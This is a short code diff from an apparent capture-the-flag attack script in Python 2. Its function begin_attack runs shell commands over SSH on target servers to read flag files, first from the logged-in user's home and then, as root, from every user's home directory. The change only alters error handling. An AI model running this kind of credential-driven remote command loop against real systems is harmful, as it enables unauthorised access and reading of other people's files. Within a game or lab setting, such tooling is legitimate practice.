@@ -190,11 +190,11 @@ def begin_attack(client):
 
             # try to find flag for the current user
             stdin, stdout, stderr = client.exec_command("cat ~/flag.txt")
-            try:
-                flag = stdout.readlines()
+            flag = stdout.readlines()
+            if len(flag) > 0:
                 print "FLAG FOUND: %s" % (flag)
                 return
-            except Exception as e:
+            else:
                 print "Flag not found on %s@%s" % (userCred, server.host)
 
 
@@ -215,11 +215,11 @@ def begin_attack(client):
 
                 # try to find the flag on the box because root can see all
                 stdin, stdout, stderr = client.exec_command("cat /home/*/flag.txt")
-                try:
-                    flag = stdout.readlines()
+                flag = stdout.readlines()
+                if len(flag) > 0:
                     print "FLAG FOUND: %s" % (flag)
                     return
-                except Exception as e:
+                else:
                     print "Flag not anywhere on %s" % (server.host)
 
             # put back in queue if never logged in as root
